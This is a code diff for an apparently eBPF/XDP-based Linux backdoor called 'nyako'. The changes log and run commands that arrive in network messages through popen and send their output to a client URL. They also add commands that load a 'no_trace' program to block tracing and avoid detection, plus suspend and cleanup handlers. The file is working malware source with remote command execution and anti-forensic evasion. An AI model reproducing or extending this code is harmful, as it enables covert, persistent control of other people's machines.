@@ -1,6 +1,29 @@
 #include "nyako.h"
 
 static bool active = false;
+static struct config cfg = {
+  .xdp_flags = XDP_FLAGS_UPDATE_IF_NOEXIST | XDP_FLAGS_SKB_MODE,
+  .ifindex = IFINDEX,
+};
+static struct no_trace_kern *no_trace_skel = NULL;
+static pthread_t no_trace_thread_id;
+static bool no_trace_enabled = false;
+
+static void disable_no_trace()
+{
+  if (no_trace_skel)
+  {
+    destroy_no_trace(no_trace_skel);
+    no_trace_skel = NULL;
+  }
+}
+
+static void cleanup()
+{
+  xdp_link_detach(cfg.ifindex, cfg.xdp_flags, NYAKO_KERN_PROG_ID);
+  disable_no_trace();
+  exit(EXIT_SUCCESS);
+}
 
 static int get_map_value(int fd, __u32 key, struct message_details *value)
 {
@@ -25,6 +48,14 @@ static int find_map_fd(const struct bpf_object *bpf_obj, const char *map_name)
 
   map_fd = bpf_map__fd(map);
   return map_fd;
+}
+
+static void* enable_no_trace(void *skel)
+{
+  no_trace_skel = (struct no_trace_kern *)skel;
+
+  setup_no_trace(no_trace_skel);
+  return NULL;
 }
 
 static void handle_message(struct message_details *message_details)
@@ -64,6 +95,8 @@ static void handle_message(struct message_details *message_details)
       return;
     }
 
+    fprintf(stdout, "executing command: '%s'\n", command);
+
     // execute the command
     cmd = popen((char *)command, "r");
     if (cmd == NULL)
@@ -100,7 +133,8 @@ static void handle_message(struct message_details *message_details)
 
       // TODO: fix to use dynamic IP
       send_request((unsigned char *)res_message, CLIENT_URL);
-      
+      fprintf(stdout, "finished executing command '%s'\n", command);
+
       bzero(cmd_output, sizeof(cmd_output));
       // break when the last segment is read
       if (feof(cmd) != 0)
@@ -116,8 +150,40 @@ static void handle_message(struct message_details *message_details)
   }
   else if (message.type == TYPE_SUSPEND_BACKDOOR)
   {
+    disable_no_trace();
     active = false;
     log_info("backdoor suspended");
+  }
+  else if (message.type == TYPE_BLOCK_TRACE)
+  {
+    if (!no_trace_enabled)
+    {
+      no_trace_skel = no_trace_kern__open();
+      if (pthread_create(&no_trace_thread_id, NULL, enable_no_trace, (void *) no_trace_skel) != 0)
+      {
+        log_error("pthread_create");
+        return;
+      }
+      no_trace_enabled = true;
+      log_info("tracing blocked");
+    }
+    else
+    {
+      log_info("tracing already blocked, do nothing...");
+    }
+  }
+  else if (message.type == TYPE_UNBLOCK_TRACE)
+  {
+    if (no_trace_skel)
+    {
+      disable_no_trace();
+      no_trace_enabled = false;
+      log_info("tracing unblocked");
+    }
+    else
+    {
+      log_info("tracing not blocked, do nothing...");
+    }
   }
   else
   {
@@ -160,12 +226,7 @@ int main()
 {
   struct bpf_object *bpf_obj;
   int message_queque_map_fd;
-  int interval = 10;
-
-  struct config cfg = {
-    .xdp_flags = XDP_FLAGS_UPDATE_IF_NOEXIST | XDP_FLAGS_SKB_MODE,
-    .ifindex = IFINDEX,
-  };
+  int interval = 5;
 
   strncpy(cfg.filename, NYAKO_KERN_FILENAME, sizeof(cfg.filename));
   strncpy(cfg.progsec, NYAKO_KERN_PROGSEC, sizeof(cfg.progsec));
@@ -176,10 +237,12 @@ int main()
     return -1;
   }
 
+  signal(SIGINT, cleanup);
+
   message_queque_map_fd = find_map_fd(bpf_obj, MESSAGE_QUEQUE_MAP_NAME);
   if (message_queque_map_fd < 0)
   {
-    xdp_link_detach(cfg.ifindex, cfg.xdp_flags, 0);
+    xdp_link_detach(cfg.ifindex, cfg.xdp_flags, NYAKO_KERN_PROG_ID);
     log_error("find_map_fd");
     return -1;
   }
